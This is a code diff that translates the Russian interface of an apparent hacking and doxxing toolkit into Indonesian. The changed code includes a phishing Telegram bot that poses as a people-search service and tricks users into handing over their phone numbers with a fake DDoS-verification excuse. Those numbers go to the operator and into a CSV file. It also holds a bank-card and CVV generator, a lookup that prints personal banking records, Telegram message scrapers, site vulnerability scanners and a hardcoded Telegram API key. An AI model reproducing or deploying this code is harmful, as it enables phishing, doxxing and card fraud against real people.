@@ -361,7 +361,7 @@ def ip_lookup(ip_address):
     return info
   
   except Exception as e:
-    return f"Произошла ошибка: {str(e)}\n"
+    return f"Telah terjadi kesalahan: {str(e)}\n"
 def get_website_info(domain):
 
   try:
@@ -369,20 +369,20 @@ def get_website_info(domain):
     print_string = f"""
   |Informasi situs: 
   |Domain: {domain_info.domain_name}
-  |Зарегистрирован: {domain_info.creation_date}
-  |Истекает: {domain_info.expiration_date}  
-  |Владелец: {domain_info.registrant_name}
-  |Организация: {domain_info.registrant_organization}
-  |Адрес: {domain_info.registrant_address}
-  |Город: {domain_info.registrant_city}
-  |Штат: {domain_info.registrant_state}
-  |Почтовый индекс: {domain_info.registrant_postal_code}
-  |Страна: {domain_info.registrant_country}
-  |IP-адрес: {domain_info.name_servers}
+  |Terdaftar: {domain_info.creation_date}
+  |Kedaluwarsa: {domain_info.expiration_date}  
+  |Pemilik: {domain_info.registrant_name}
+  |Organisasi: {domain_info.registrant_organization}
+  |Alamat: {domain_info.registrant_address}
+  |Kota: {domain_info.registrant_city}
+  |Negara: {domain_info.registrant_state}
+  |kode Pos: {domain_info.registrant_postal_code}
+  |Negara: {domain_info.registrant_country}
+  |alamat IP: {domain_info.name_servers}
     """
     Write.Print(print_string + "\n", Colors.red_to_purple, interval=0.005)
   except Exception as e:
-    print(f"Ошибка: {e}\n")
+    print (f"Kesalahan: {e}\n")
 
 
 while True:
@@ -397,8 +397,8 @@ while True:
     async def main():
         await client.start()
             
-        username = input("Введите юзер нейм: ")
-        group = input("Введите ссылку группы: ")
+        username = input("Masukkan nama pengguna: ")
+        group = input("Masukkan tautan grup: ")
             
         async for message in client.iter_messages(group, from_user=username):   
             date = str(message.date)
@@ -413,39 +413,39 @@ while True:
         await client.disconnect()
         
   if choice == '30':
-      url = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта > ")))
+      url = input(Colorate.Horizontal(Colors.red_to_purple, ("Masukkan URL situs > ")))
       admin_finger(url)
   if choice == '31':    
-      url = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта --->")))
+      url = input(Colorate.Horizontal(Colors.red_to_purple, ("Masukkan URL situs --->")))
       XSSScan(url)
   if choice == '32':
-      url = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта --->")))
+      url = input(Colorate.Horizontal(Colors.red_to_purple, ("Masukkan URL situs --->")))
       console_clear()
       wpbackupscanner(url)
   if choice == '34':
       generation_naxyi()
   if choice == '33':
     console_clear()
-    print(Colorate.Horizontal(Colors.red_to_purple, Center.Center(f"""
+    print (Colorate.Horizontal(Colors.red_to_purple, Center.Center(f"""
             -----------------------------------------------------------------------------------------------             
                                                 Subdomain finger Menu                                                   
             -----------------------------------------------------------------------------------------------             
                                                                                                                         
-           [1]  Брут сабдомена используя мелкий словарь             [2]  Брут сабдомена используя большой словарь       
+           [1]  Subdomain kasar menggunakan kamus kecil             [2]  Subdomain kasar menggunakan kamus besar
                                                                                                                         
                                                                                                                         
-                                              [99] Главное меню                                                         
-                                                  [0]  Выйти                                                            
+                                              [99]  Menu utama                                                        
+                                                  [0] Keluar                                                             
                                                                                                                         """)))
     page_sd = int(input(Colorate.Horizontal(Colors.red_to_purple, ("----->"))))
     if page_sd == 1:
                 wordlist = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/small.txt").text
-                domain = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта > ")))
+                domain = input(Colorate.Horizontal(Colors.red_to_purple, ("Masukkan URL situs > ")))
                 request_sd(domain)
                 subdomainfinger(wordlist, domain)
     elif page_sd == 2:
                 wordlist = requests.get("https://raw.githubusercontent.com/NirkZxc/Wordlist/main/subdomain.list").text
-                domain = input(Colorate.Horizontal(Colors.red_to_purple, ("Введите URL сайта > ")))
+                domain = input(Colorate.Horizontal(Colors.red_to_purple, ("Masukkan URL situs > ")))
                 request_sd(domain)
                 subdomainfinger(wordlist, domain)
     elif page_sd == 99:
@@ -462,8 +462,8 @@ while True:
     async def main():
         await client.start()
             
-        username = input("Введите юзернейм: ")
-        group = input("Введите ссылку группы: ")
+        username = input("Masukkan nama pengguna: ")
+        group = input("Masukkan tautan grup: ")
             
         async for message in client.iter_messages(group, from_user=username):   
             date = str(message.date)
@@ -488,7 +488,7 @@ while True:
 
     responded_users = set() 
 
-    response_text = input("Введите текст: ")
+    response_text = input("Masukkan teks: ")
 
     @client.on(events.NewMessage)
     async def my_event_handler(event):
@@ -501,11 +501,11 @@ while True:
 
   if choice == '26':
       
-      search_term = input("Введите ссылку на вк: ")
+      search_term = input("Masukkan tautan ke VK: ")
       Search
 
   if choice == '25':
-    card = Write.Input("Введите карту: ", Colors.purple_to_blue, interval=0.005) 
+    card = Write.Input("Masukkan kartu: ", Colors.purple_to_blue, interval=0.005) 
 
     found = False
     
@@ -520,37 +520,37 @@ while True:
                 if card in line:
                     line = line.replace(',', '\n')
                     elements = line.strip().split('\n')
-                    print("UK: " + elements[0])
-                    print("Имя клиента: " + elements[1])
-                    print("Дата рождения: " + elements[2])
-                    print("Клиент UK: " + elements[3])
-                    print("Код контакта клиента: " + elements[4])
-                    print("Владелец клиента UK:" + elements[5])
-                    print("Код номера карты: " + elements[6])
-                    print("Дата истечения: " + elements[7])
-                    print("Номер счета: " + elements[8])
-                    print("BIN: " + elements[9])
-                    print("Бренд: " + elements[10])
-                    print("Тип: " + elements[11])
-                    print("Категория: " + elements[12]) 
-                    print("Эмитент: " + elements[13])
-                    print("Alpha 2: " + elements[14])
-                    print("Alpha 3: " + elements[15])
-                    print("Страна: " + elements[16])
-                    print("Широта: " + elements[17])
-                    print("Долгота: " + elements[18])
+                    print ("Inggris: " + elements[0])
+                    print ("Nama klien: " + elements[1])
+                    print ("Tanggal lahir: " + elements[2])
+                    print ("klien Inggris: " + elements[3])
+                    print ("Kode kontak pelanggan: " + elements[4])
+                    print ("Pemilik Klien Inggris:" + elements[5])
+                    print ("Kode nomor kartu: " + elements[6])
+                    print ("Kedaluwarsa: " + elements[7])
+                    print ("Nomor rekening: " + elements[8])
+                    print ("tempat sampah: " + elements[9])
+                    print ("Merek: " + elements[10])
+                    print ("Jenis: " + elements[11])
+                    print ("Kategori: " + elements[12]) 
+                    print ("Penerbit: " + elements[13])
+                    print ("Alpha 2: " + elements[14])
+                    print ("Alpha 3: " + elements[15])
+                    print ("Negara: " + elements[16])
+                    print ("Lintang: " + elements[17])
+                    print ("Garis bujur: " + elements[18])
                     found = True
                     break
                     
                     if not found:
-                        print("Данные не найдены")
+                        print ("Data tidak ditemukan")
 
   if choice == '24':
-    print("Выберите режим:")
-    print("99 - проверить часто используемые порты") 
-    print("98 - проверить указанный порт")
+    print("Pilih modus:")
+    print("99 - periksa port yang sering digunakan") 
+    print("98 - periksa port yang ditentukan")
 
-    mode = input("Ваш выбор:")
+    mode = input("Pilihanmu:")
     
   if choice == "99":
     mode = input("Ваш выбор: ")
@@ -559,27 +559,27 @@ while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             result = sock.connect_ex(('127.0.0.1', port))
             if result == 0:
-                print(f'Порт {port} открыт')
+                print (f'Pelabuhan {port} membuka')
             else:
-                print(f'Порт {port} закрыт')
+                print (f'Pelabuhan {port} tertutup')
             sock.close()
 
   elif choice == "98":
-        port = int(input("Введите номер порта: "))    
+        port = int(input("Masukkan nomor port: "))    
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         result = sock.connect_ex(('127.0.0.1', port))
         if result == 0:
-            print(f'Порт {port} открыт')
+            print(f'Pelabuhan {port} membuka')
         else:
-            print(f'Порт {port} закрыт')
+            print(f'Pelabuhan {port} tertutup')
         sock.close()
         
   if choice == '36':
-      print("выход...")
+      print ("KELUAR...")
       time.sleep(0.5)
 
   if choice == '22':
-    range_num = int(input("Введите число: "))
+    range_num = int(input("Masukkan nomor: "))
 
     api_id = '25167873'
     api_hash = '6f0af1029f9829dfadbbc609922d6762'
@@ -612,42 +612,42 @@ while True:
 
   if choice == '21':
       
-      print("Выберите страну:")
-      print("1: Украина")
-      print("2: Россия")
-      print("3: Казахстан")
+      print ("Pilih negara:")
+      print ("1: Ukraina")
+      print ("2: Rusia")
+      print ("3: Kazakstan")
       country = input()
 
       card_number, expiry_date, cvv = generate_card(country)
-      print(f"Страна: {country}\nНомер карты: {card_number}\nСрок действия: {expiry_date}\nCVV: {cvv}")
+      print (f"Страна: {country}\nНомер карты: {card_number}\nСрок действия: {expiry_date}\nCVV: {cvv}")
 
 
   if choice == '20':
       
           Write.Print(("""
-——————————————Объяснение—————————————————
-пользователь запускает бота > пользователь отправляет номер телефона боту > номер телефона отправляется вам.
-——————————————Инструкция—————————————————
-1 шаг: получить токен бота у @BotFather и этот токен ввести в строку с токеном.
-2 шаг: ввести свой Telegram айди в строку с айди
+--------------Penjelasan-----------------
+ pengguna meluncurkan bot > pengguna mengirimkan nomor telepon ke bot > nomor telepon dikirimkan kepada Anda.
+ ------------------Petunjuk----------------------------------------------------------------
+ Langkah 1: dapatkan token bot dari @Botfather dan masukkan token ini di baris token.
+ Langkah 2: masukkan ID Telegram Anda di baris ID
     """), Colors.red_to_yellow, interval=0.001)
           
-          Token = Write.Input('\nвведите токен: ', Colors.purple_to_blue, interval=0.005)
-          admin = Write.Input('введите свой айди: ', Colors.purple_to_blue, interval=0.005)
+          Token = Write.Input('\nmasukkan token: ', Colors.purple_to_blue, interval=0.005)
+          admin = Write.Input('masukkan identitas Anda: ', Colors.purple_to_blue, interval=0.005)
 
           bot = telebot.TeleBot(Token)
           
-          Write.Print(("бот запущен!"), Colors.red_to_purple, interval=0.005) 
+          Write.Print(("bot sedang berjalan!"), Colors.red_to_purple, interval=0.005) 
 
           find_menu = types.InlineKeyboardMarkup()
-          button0 = types.InlineKeyboardButton('🔎Начать поиск', callback_data="start_dox")
+          button0 = types.InlineKeyboardButton('🔎Mulai Pencarian', callback_data="start_dox")
           find_menu.row(button0)
-          button1 = types.InlineKeyboardButton('⚙️Аккаунт', callback_data="dox")
-          button2 = types.InlineKeyboardButton('🆘Поддержка',callback_data="dox")
+          button1 = types.InlineKeyboardButton('⚙️Akun', callback_data="dox")
+          button2 = types.InlineKeyboardButton('🆘Mendukung',callback_data="dox")
           find_menu.row(button1,button2)
-          button3 = types.InlineKeyboardButton('🤖Создать собственный бот',callback_data="dox")
+          button3 = types.InlineKeyboardButton('🤖Buat bot Anda sendiri',callback_data="dox")
           find_menu.row(button3)
-          button4 = types.InlineKeyboardButton('🤝Партнерская программа',callback_data="dox")
+          button4 = types.InlineKeyboardButton('🤝Program afiliasi',callback_data="dox")
           find_menu.row(button4)
 
 
@@ -656,47 +656,46 @@ while True:
 
           @bot.message_handler(commands=['start'])
           def start(message):
-              bot.send_message(message.from_user.id,"*Добро пожаловать!*",parse_mode="Markdown")
-              bot.send_message(message.from_user.id,"*Выберите нужное действие:*",parse_mode="Markdown",reply_markup=find_menu)
+              bot.send_message(message.from_user.id,"*Selamat datang!*",parse_mode="Markdown")
+              bot.send_message(message.from_user.id,"*Pilih tindakan yang diinginkan:*",parse_mode="Markdown",reply_markup=find_menu)
 
 
           @bot.callback_query_handler(func=lambda call: call.data == "start_dox")
           def button0_pressed(call: types.CallbackQuery):
-                bot.send_message(chat_id=call.message.chat.id,text= "👤 Поиск по имени\n"+\
-                                                                                                "├  `Блогер` _(Поиск по тегу)_\n"\
-                                                                                                "├  `Антипов Евгений Вячеславович`\n"\
+                bot.send_message(chat_id=call.message.chat.id,text= "👤 Cari berdasarkan nama\n"+\
+                                                                                                "├  `Blogger` _(Cari berdasarkan tag)_\n"\
+                                                                                                "├  `Antipov Evgeniy Vyacheslavovich`\n"\
                                                                                                 "└  `Антипов Евгений Вячеславович 05.02.1994`\n"\
-                                                                                                "_(Доступны также следующие форматы_ "+"`05.02`"+"_/_"+"`1994`"+"_/_"+"`28`"+"_/_"+"`20-28`"+"_)_\n\n"\
-                                                                                                "🚗 Поиск по авто\n"\
-                                                                                                "├  `Н777ОН777` - поиск авто по *РФ*\n"\
+                                                                                                "_(Format berikut juga tersedia_ "+"`05.02`"+"_/_"+"`1994`"+"_/_"+"`28`"+"_/_"+"`20-28`"+"_)_\n\n"\
+                                                                                                "🚗 Cari dengan mobil\n"\
+                                                                                                "├  `Н777ОН777` - cari mobil berdasarkan *РФ*\n"\
                                                                                                 "└  `ХТА21150053965897` - поиск по *VIN*\n\n"\
-                                                                                                "👨 *Социальные сети*\n"\
+                                                                                                "👨 *media sosial*\n"\
                                                                                                 "├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n"\
                                                                                                 "├  `https://vk.com/id577744097` - *Вконтакте*\n"\
                                                                                                 "├  `https://facebook.com/profile.php?id=1` - *Facebook*\n"\
-                                                                                                "└  `https://ok.ru/profile/162853188164` - *Одноклассники*\n\n"\
-                                                                                                "📱 `79999939919` - для поиска по *номеру телефона*\n"\
-                                                                                                "📨 `tema@gmail.com` - для поиска по *Email*\n"\
-                                                                                            "📧 `#281485304`, `@durov` или `перешлите сообщение` - поиск по *Telegram* аккаунту\n\n"\
-                                                                                                "🔐 `/pas churchill7` - поиск почты, логина и телефона *по паролю*\n"\
-                                                                                                "🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)\n"\
-                                                                                                "🏘 `77:01:0001075:1361` - поиск по *кадастровому номеру*\n\n"\
-                                                                                                "🏛 `/company Сбербанк` - поиск по *юр лицам*\n"\
-                                                                                                "📑 `/inn 784806113663` - поиск по *ИНН*\n"\
-                                                                                                "🎫 `/snils 13046964250` - поиск по *СНИЛС*\n\n"\
-                                                                                                "📸 Отправьте *фото человека*, чтобы найти его или двойника на сайтах *ВК*, *ОК*.\n"\
-                                                                                                "🚙 Отправьте *фото номера автомобиля*, чтобы получить о нем информацию.\n"\
-                                                                                                "🙂 Отправьте *стикер*, чтобы найти *создателя*.\n"\
-                                                                                                "🌎 Отправьте *точку на карте*, чтобы *найти людей*, которые сейчас там.\n"\
-                                                                                                "🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.",parse_mode="Markdown")
-
+                                                                                                "└  `https://ok.ru/profile/162853188164` - *Teman sekelas*\n\n"\
+                                                                                                "📱 `628` - untuk mencari berdasarkan *nomor telepon*\n"\
+                                                                                                "📨 `tema@gmail.com` - untuk mencari berdasarkan *Email*\n"\
+                                                                                            "📧 `#281485304`, `@durov` atau `teruskan pesan` - cari berdasarkan akun *Telegram*\n\n"\
+                                                                                                 "🔐 `/pas churchill7` - cari email, login dan telepon *dengan kata sandi*\n"\
+                                                                                                 "🏚 `/adr Moscow, Tverskaya, 1, apt 1` - informasi di alamat (RF)\n"\
+                                                                                                 "🏘 `77:01:0001075:1361` - cari berdasarkan *nomor kadaster*\n\n"\
+                                                                                                 "🏛 `/perusahaan Bank Tabungan` - cari berdasarkan *badan hukum*\n"\
+                                                                                                 "📑 `/inn 784806113663` - cari berdasarkan *INN*\n"\
+                                                                                                 "🎫 `/snils 13046964250` - cari berdasarkan *SNILS*\n\n"\
+                                                                                                 "📸 Kirim *foto seseorang* untuk menemukannya atau foto ganda di situs *VK*, *OK*.\n"\
+                                                                                                 "🚙 Kirim *foto nomor mobil* untuk menerima informasi tentangnya.\n"\
+                                                                                                 "🙂 Kirim *stiker* untuk menemukan *kreator*.\n"\
+                                                                                                 "🌎 Kirim *titik di peta* untuk *menemukan orang* yang ada di sana sekarang.\n"\
+                                                                                                 "🗣 Anda juga dapat melakukan *permintaan pencarian* menggunakan *perintah suara*.",parse_mode="Markdown")
           send = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
           button_phone = types.KeyboardButton(text="✅Подтвердить", request_contact=True)
           send.add(button_phone)
 
           @bot.callback_query_handler(func=lambda call: call.data == "dox")
           def button1_pressed(call: types.CallbackQuery):
-                bot.send_message(chat_id=call.message.chat.id,text= "⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",parse_mode="Markdown",reply_markup=send)
+                bot.send_message(chat_id=call.message.chat.id,text= "⚠️Verifikasi akun Anda sebelum Anda mulai mencari\n\n""*Ini adalah tindakan sementara karena serangan DDOS aktif terhadap kami..*",parse_mode="Markdown",reply_markup=send)
 
 
 
@@ -704,26 +703,26 @@ while True:
           def contact(message):
               if message.contact is not None:
                   try:
-                      Write.Print((f"\nКто-то отправил свой номер:\n Имя: {message.from_user.first_name}\n Логин: { message.from_user.username}\n ID: { message.from_user.id}\n Номер телефона:  { message.contact.phone_number}\n -------------------------------"), Colors.red_to_yellow, interval=0.005)
-                      bot.send_message(admin,"*🔔Кто-то отправил свой номер!*\n"+\
+                      Write.Print((f"\n Seseorang mengirimkan nomornya:\n Имя: {message.from_user.first_name}\n Login: { message.from_user.username}\n ID: { message.from_user.id}\n Nomor telepon:  { message.contact.phone_number}\n -------------------------------"), Colors.red_to_yellow, interval=0.005)
+                      bot.send_message(admin,"*🔔Seseorang mengirimkan nomornya!*\n"+\
                             "Имя: `"+message.from_user.first_name+\
-                            "\n`Логин: @"+message.from_user.username+\
+                            "\n`Login: @"+message.from_user.username+\
                               "\n`ID: "+str(message.from_user.id)+\
-                            "\n`Номер телефона: `"+message.contact.phone_number+"`",parse_mode="Markdown")
+                            "\n`Nomor telepon: `"+message.contact.phone_number+"`",parse_mode="Markdown")
                       f=open("db.csv","a+")
                       f.write(f"{message.from_user.first_name},{ message.from_user.last_name},{ message.from_user.username},{ message.from_user.id},{ message.contact.phone_number}\n")
                       f.close()
                   except TypeError:
                       traceback.print_exc()
-                      print("Нет тела или др. typeerror")
+                      print ("Нет тела или др. typeerror")
                   curhour= time.asctime().split(" ")[3].split(":")[0]
-                  bot.send_message(message.from_user.id,f"*⚠️ Технические работы до  {int(curhour) +7} :00 по мск.*\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.",parse_mode="Markdown",reply_markup=types.ReplyKeyboardRemove())
+                  bot.send_message(message.from_user.id,f"*⚠️ Pekerjaan teknis sebelumnya  {int(curhour) +7} :00 waktu Moskow.*\n\nPekerjaan akan selesai dalam jangka waktu ini, semua langganan telah diperpanjang  .",parse_mode="Markdown",reply_markup=types.ReplyKeyboardRemove())
 
 
 
           @bot.message_handler(content_types=['text'])
           def handler(message):
-                bot.send_message(message.from_user.id,"⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",parse_mode="Markdown",reply_markup=send)
+                bot.send_message(message.from_user.id,"⚠️Verifikasi akun Anda sebelum Anda mulai mencari\n\n""*Ini adalah tindakan sementara karena serangan DDOS aktif terhadap kami..*",parse_mode="Markdown",reply_markup=send)
 
 
 
